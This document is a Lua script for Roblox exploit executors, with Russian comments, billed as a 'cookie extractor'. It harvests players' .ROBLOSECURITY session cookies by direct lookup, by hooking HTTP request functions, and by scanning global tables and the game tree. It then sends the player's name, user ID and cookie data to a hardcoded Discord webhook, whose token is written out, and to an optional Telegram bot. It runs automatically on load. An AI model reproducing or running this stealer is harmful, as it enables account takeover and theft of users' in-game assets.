-- ============================================
-- DIX ROBLOX COOKIE EXTRACTOR v3.0
-- Сбор и отправка _.ROBLOSECURITY куки
-- ============================================

local DIX_CookieSystem = {
    _VERSION = "3.0.0",
    _AUTHOR = "Stalker-2033",
    _PROTOCOL = "DIX"
}

-- Конфигурация отправки
DIX_CookieSystem.Config = {
    -- Discord Webhook для отправки
    DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467828785465397309/xxIU29gmHsJXRiDZuGyJW2vapxYcX_45J_2CuJMZN6Tutnpz6a7OALj00Sk_NMqphemw",
    
    -- Telegram Bot (альтернатива)
    
    
    -- Настройки
    ENABLE_ENCRYPTION = true,
    SEND_IMMEDIATELY = true,
    MAX_RETRIES = 3
}

-- Основная функция извлечения куки
function DIX_CookieSystem.extractRobloxCookie()
    local extractedCookies = {}
    
    -- Метод 1: Прямой доступ через HttpService
    local function method1_DirectAccess()
        local cookieNames = {
            "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_",
            ".ROBLOSECURITY",
            "ROBLOSECURITY",
            "_|WARNING"
        }
        
        for _, cookieName in ipairs(cookieNames) do
            local success, cookieValue = pcall(function()
                return game:GetService("HttpService"):GetCookie(cookieName)
            end)
            
            if success and cookieValue and #cookieValue > 100 then
                table.insert(extractedCookies, {
                    method = "HttpService:GetCookie",
                    name = cookieName,
                    value = cookieValue,
                    length = #cookieValue,
                    timestamp = os.date("%Y-%m-%d %H:%M:%S")
                })
                return true
            end
        end
        return false
    end
    
    -- Метод 2: Перехват HTTP запросов
    local function method2_RequestInterception()
        if not (hookfunction and getgenv) then return false end
        
        local captured = {}
        
        -- Сохраняем оригинальную функцию
        local originalRequest
        if syn and syn.request then
            originalRequest = syn.request
        elseif request then
            originalRequest = request
        end
        
        if not originalRequest then return false end
        
        -- Хук функции
        local hooked = false
        pcall(function()
            hookfunction(originalRequest, function(options)
                -- Проверяем заголовки на наличие куки
                if options and options.Headers then
                    for headerName, headerValue in pairs(options.Headers) do
                        local headerStr = tostring(headerName):lower()
                        if headerStr:find("cookie") or headerStr:find("authorization") then
                            table.insert(captured, {
                                url = options.Url or "unknown",
                                header = headerName,
                                value = tostring(headerValue):sub(1, 200)
                            })
                        end
                    end
                end
                
                -- Также проверяем тело запроса
                if options and options.Body then
                    local bodyStr = tostring(options.Body)
                    if bodyStr:find("ROBLOSECURITY") or bodyStr:find("_|WARNING") then
                        table.insert(captured, {
                            url = options.Url or "unknown",
                            type = "body",
                            value = bodyStr:sub(1, 200)
                        })
                    end
                end
                
                -- Вызываем оригинальный запрос
                return originalRequest(options)
            end)
            hooked = true
        end)
        
        -- Делаем тестовый запрос чтобы активировать перехват
        if hooked then
            pcall(function()
                originalRequest({
                    Url = "https://www.roblox.com/game/GetCurrentUser.ashx",
                    Method = "GET"
                })
            end)
            
            if #captured > 0 then
                for _, capture in ipairs(captured) do
                    table.insert(extractedCookies, {
                        method = "Request Interception",
                        source = capture.url,
                        value = capture.value,
                        length = #capture.value
                    })
                end
                return true
            end
        end
        
        return false
    end
    
    -- Метод 3: Поиск в глобальных переменных
    local function method3_GlobalVariables()
        local found = {}
        
        -- Поиск в getgenv
        if getgenv then
            pcall(function()
                local env = getgenv()
                for key, value in pairs(env) do
                    if type(value) == "string" then
                        if value:find("_|WARNING") or value:find("ROBLOSECURITY") then
                            table.insert(found, {
                                source = "getgenv." .. tostring(key),
                                value = value:sub(1, 150),
                                length = #value
                            })
                        end
                    end
                end
            end)
        end
        
        -- Поиск в shared
        if shared then
            pcall(function()
                for key, value in pairs(shared) do
                    if type(value) == "string" and (value:find("_|WARNING") or value:find("ROBLOSECURITY")) then
                        table.insert(found, {
                            source = "shared." .. tostring(key),
                            value = value:sub(1, 150),
                            length = #value
                        })
                    end
                end
            end)
        end
        
        -- Поиск в _G
        pcall(function()
            for key, value in pairs(_G) do
                if type(value) == "string" and (value:find("_|WARNING") or value:find("ROBLOSECURITY")) then
                    table.insert(found, {
                        source = "_G." .. tostring(key),
                        value = value:sub(1, 150),
                        length = #value
                    })
                end
            end
        end)
        
        if #found > 0 then
            for _, item in ipairs(found) do
                table.insert(extractedCookies, {
                    method = "Global Variables",
                    source = item.source,
                    value = item.value,
                    length = item.length
                })
            end
            return true
        end
        
        return false
    end
    
    -- Метод 4: Через DataModel и сервисы
    local function method4_DataModelScan()
        local foundItems = {}
        
        local function scanObject(obj, depth, path)
            if depth > 2 then return end
            
            pcall(function()
                -- Проверяем свойства объекта
                for _, prop in pairs({"Value", "Text", "Source", "Cookie", "Token"}) do
                    if obj[prop] and type(obj[prop]) == "string" then
                        local val = tostring(obj[prop])
                        if val:find("_|WARNING") or val:find("ROBLOSECURITY") then
                            table.insert(foundItems, {
                                path = path .. "." .. prop,
                                value = val:sub(1, 100),
                                length = #val
                            })
                        end
                    end
                end
                
                -- Рекурсивно сканируем детей
                for _, child in pairs(obj:GetChildren()) do
                    scanObject(child, depth + 1, path .. "." .. child.Name)
                end
            end)
        end
        
        -- Начинаем сканирование с корня
        scanObject(game, 0, "game")
        
        if #foundItems > 0 then
            for _, item in ipairs(foundItems) do
                table.insert(extractedCookies, {
                    method = "DataModel Scan",
                    path = item.path,
                    value = item.value,
                    length = item.length
                })
            end
            return true
        end
        
        return false
    end
    
    -- Запуск всех методов
    method1_DirectAccess()
    method2_RequestInterception()
    method3_GlobalVariables()
    method4_DataModelScan()
    
    return extractedCookies
end

-- Шифрование данных (базовое)
function DIX_CookieSystem.encryptData(data, key)
    if not DIX_CookieSystem.Config.ENABLE_ENCRYPTION then
        return data
    end
    
    key = key or "DIX_SECURE_KEY_2025_" .. game:GetService("Players").LocalPlayer.UserId
    
    local encrypted = ""
    for i = 1, #data do
        local charCode = string.byte(data, i)
        local keyChar = string.byte(key, (i % #key) + 1)
        encrypted = encrypted .. string.char(bit32.bxor(charCode, keyChar))
    end
    
    return encrypted
end

-- Отправка в Discord
function DIX_CookieSystem.sendToDiscord(cookies)
    if not DIX_CookieSystem.Config.DISCORD_WEBHOOK or 
       DIX_CookieSystem.Config.DISCORD_WEBHOOK:find("ВАШ_WEBHOOK") then
        return false, "Discord webhook not configured"
    end
    
    local http = syn and syn.request or request
    if not http then return false, "No HTTP function" end
    
    -- Форматирование сообщения
    local player = game:GetService("Players").LocalPlayer
    local message = "**🍪 DIX COOKIE EXTRACTION REPORT**\n\n"
    message = message .. string.format("**👤 Player:** `%s`\n", player.Name)
    message = message .. string.format("**🆔 UserID:** `%d`\n", player.UserId)
    message = message .. string.format("**🎮 PlaceID:** `%d`\n", game.PlaceId)
    message = message .. string.format("**🕐 Time:** %s\n\n", os.date("%Y-%m-%d %H:%M:%S"))
    
    message = message .. "**📊 Extraction Results:**\n"
    
    if #cookies == 0 then
        message = message .. "❌ No cookies found\n"
    else
        message = message .. string.format("✅ Found %d cookie(s)\n\n", #cookies)
        
        for i, cookie in ipairs(cookies) do
            message = message .. string.format("**#%d - %s**\n", i, cookie.method)
            message = message .. string.format("Length: `%d` chars\n", cookie.length)
            
            if cookie.source then
                message = message .. string.format("Source: `%s`\n", cookie.source)
            end
            
            -- Показываем часть зашифрованной куки
            if cookie.value and #cookie.value > 0 then
                local encryptedPart = DIX_CookieSystem.encryptData(cookie.value:sub(1, 50), "DIX_KEY")
                message = message .. string.format("Encrypted sample: `%s`\n", encryptedPart:sub(1, 80))
            end
            
            message = message .. "\n"
        end
    end
    
    -- Отправка
    local success, response = pcall(function()
        return http({
            Url = DIX_CookieSystem.Config.DISCORD_WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-DIX-Version"] = DIX_CookieSystem._VERSION
            },
            Body = game:GetService("HttpService"):JSONEncode({
                content = message,
                username = "DIX Cookie Extractor",
                avatar_url = "https://i.imgur.com/5Yj6X7n.png"
            })
        })
    end)
    
    return success, success and "Sent to Discord" or response
end

-- Отправка в Telegram
function DIX_CookieSystem.sendToTelegram(cookies)
    if not DIX_CookieSystem.Config.TELEGRAM_BOT_TOKEN then
        return false, "Telegram bot token not configured"
    end
    
    local http = syn and syn.request or request
    if not http then return false, "No HTTP function" end
    
    local player = game:GetService("Players").LocalPlayer
    local message = "🍪 *DIX Cookie Extraction Report*\n\n"
    message = message .. string.format("👤 *Player:* `%s`\n", player.Name)
    message = message .. string.format("🆔 *UserID:* `%d`\n", player.UserId)
    message = message .. string.format("📊 *Found:* %d cookie(s)\n\n", #cookies)
    
    -- Добавляем информацию о каждой куки
    for i, cookie in ipairs(cookies) do
        message = message .. string.format("*#%d - %s*\n", i, cookie.method)
        message = message .. string.format("Length: `%d`\n", cookie.length)
        
        if i >= 2 then  -- Ограничиваем количество
            message = message .. "...\n"
            break
        end
    end
    
    -- Отправка во все указанные чаты
    local results = {}
    for _, chatId in ipairs(DIX_CookieSystem.Config.TELEGRAM_CHAT_IDS) do
        local success, response = pcall(function()
            return http({
                Url = "https://api.telegram.org/bot" .. DIX_CookieSystem.Config.TELEGRAM_BOT_TOKEN .. "/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = game:GetService("HttpService"):JSONEncode({
                    chat_id = chatId,
                    text = message,
                    parse_mode = "Markdown",
                    disable_web_page_preview = true
                })
            })
        end)
        
        table.insert(results, {
            chat_id = chatId,
            success = success,
            response = response
        })
    end
    
    return #results > 0, results
end

-- Основная функция
function DIX_CookieSystem.execute()
    print(string.format("[DIX] 🚀 Starting Cookie Extractor v%s", DIX_CookieSystem._VERSION))
    print("[DIX] 🔍 Extracting Roblox cookies...")
    
    -- Извлечение куки
    local extractedCookies = DIX_CookieSystem.extractRobloxCookie()
    
    -- Логирование результатов
    print(string.format("[DIX] 📊 Found %d cookie(s)", #extractedCookies))
    
    for i, cookie in ipairs(extractedCookies) do
        print(string.format("[DIX] #%d: %s (%d chars)", 
            i, cookie.method, cookie.length))
    end
    
    -- Отправка результатов
    if DIX_CookieSystem.Config.SEND_IMMEDIATELY then
        local discordSuccess, discordMsg = DIX_CookieSystem.sendToDiscord(extractedCookies)
        print(string.format("[DIX] Discord send: %s", discordSuccess and "✅" or "❌"))
        
        local telegramSuccess, telegramResults = DIX_CookieSystem.sendToTelegram(extractedCookies)
        print(string.format("[DIX] Telegram send: %s", telegramSuccess and "✅" or "❌"))
    end
    
    -- Возврат результатов (только для отладки)
    return {
        success = #extractedCookies > 0,
        count = #extractedCookies,
        cookies_safe = extractedCookies,  -- Безопасная версия без полных значений
        timestamp = os.date(),
        version = DIX_CookieSystem._VERSION
    }
end

-- Автоматический запуск
if DIX_CookieSystem.Config.SEND_IMMEDIATELY then
    local results = DIX_CookieSystem.execute()
    
    -- Уведомление в игре
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = results.success and "✅ DIX Cookie" or "⚠️ DIX Cookie",
        Text = string.format("Found %d cookie(s)", results.count),
        Duration = 3
    })
end

-- Экспорт системы
return DIX_CookieSystem